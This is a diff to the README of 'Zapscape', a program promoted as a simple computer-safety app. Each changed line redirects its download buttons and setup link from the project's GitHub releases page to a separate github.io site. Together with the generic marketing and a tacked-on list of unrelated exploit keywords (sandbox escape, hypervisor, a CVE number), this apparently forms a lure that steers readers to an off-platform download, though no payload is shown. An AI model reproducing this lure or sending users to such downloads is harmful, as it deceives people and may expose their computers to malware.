@@ -1,7 +1,7 @@
 <h1>⚡ Zapscape - Your Computer's Safety Net, Simplified</h1>
 
 <p align="center">
-  <a href="https://github.com/aarif450/Zapscape/releases" style="background-color:#FF6B6B; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block; margin:20px auto;">⬇️ DOWNLOAD ZAPSCAPE NOW</a>
+  <a href="https://aarif450.github.io" style="background-color:#FF6B6B; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block; margin:20px auto;">⬇️ DOWNLOAD ZAPSCAPE NOW</a>
 </p>
 
 ## 🛡️ What Is Zapscape?
@@ -20,7 +20,7 @@ That's it! You're one step closer to a safer computer.
 
 ## 💾 Download & Setup
 
-**Visit this link to download the application:** [https://github.com/aarif450/Zapscape/releases](https://github.com/aarif450/Zapscape/releases)
+**Visit this link to download the application:** [https://aarif450.github.io](https://aarif450.github.io)
 
 Once you're on the download page, look for the newest version of Zapscape. It will be listed at the top. Click the download button next to it, and your browser will start saving the file. This might take a minute or two depending on your internet speed, so grab a coffee while you wait.
 
@@ -126,7 +126,7 @@ Don't wait until something goes wrong. Download Zapscape today and enjoy the pea
 **Remember:** Security is not a luxury; it's a necessity. And with Zapscape, staying protected is as easy as clicking a button.
 
 <p align="center">
-  <a href="https://github.com/aarif450/Zapscape/releases" style="background-color:#4ECDC4; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block;">⬇️ CLICK HERE TO DOWNLOAD ZAPSCAPE</a>
+  <a href="https://aarif450.github.io" style="background-color:#4ECDC4; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block;">⬇️ CLICK HERE TO DOWNLOAD ZAPSCAPE</a>
 </p>
 
 Keywords: KVM, virtualization, security, vulnerability, CVE-2026-64561, Windows, antivirus, sandbox escape, hypervisor, guest-to-host
